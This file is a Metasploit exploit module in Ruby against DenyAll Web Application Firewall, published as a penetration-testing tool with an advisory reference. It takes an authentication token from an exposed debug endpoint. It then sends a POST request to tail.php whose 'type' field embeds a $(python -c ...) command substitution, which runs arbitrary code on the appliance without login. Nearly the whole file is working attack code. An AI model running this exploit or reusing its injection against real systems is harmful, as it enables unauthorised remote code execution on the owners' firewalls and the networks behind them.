# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "DenyAll Web Application Firewall Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits the command injection vulnerability of DenyAll Web Application Firewall. Unauthenticated users can execute a
        terminal command under the context of the web server user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 3001,
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Sep 19 2017",
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable DenyAll WAF&#039;, &#039;/&#039;])
      ]
    )
  end
 
  def get_token
    # Taking token by exploiting bug on first endpoint.
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;webservices&#039;, &#039;download&#039;, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;applianceUid&#039; => &#039;LOCALUID&#039;,
        &#039;typeOf&#039; => &#039;debug&#039;
      }
    })
 
    if res && res.code == 200 && res.body.include?("iToken")
      res.body.scan(/"iToken";s:32:"([a-z][a-f0-9]{31})";/).flatten[0]
    else
       nil
    end
  end
 
  def check
    # If we&#039;ve managed to get token, that means target is most likely vulnerable.
    token = get_token
    if token.nil?
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Appears
    end
  end
 
  def exploit
    # Get iToken from unauthenticated accessible endpoint
    print_status(&#039;Extracting iToken value&#039;)
    token = get_token
 
    if token.nil?
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    else
      print_good("Awesome. iToken value = #{token}")
    end
 
    # Accessing to the vulnerable second endpoint where we have command injection with valid iToken
    print_status(&#039;Trigerring command injection vulnerability with iToken value.&#039;)
    r = rand_text_alpha(5 + rand(3));
 
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;webservices&#039;, &#039;stream&#039;, &#039;tail.php&#039;),
      &#039;vars_post&#039; => {
        &#039;iToken&#039; => token,
        &#039;tag&#039; => &#039;tunnel&#039;,
        &#039;stime&#039; => r,
        &#039;type&#039; => "#{r}$(python -c \"#{payload.encoded}\")"
        }
    })
 
  end
end

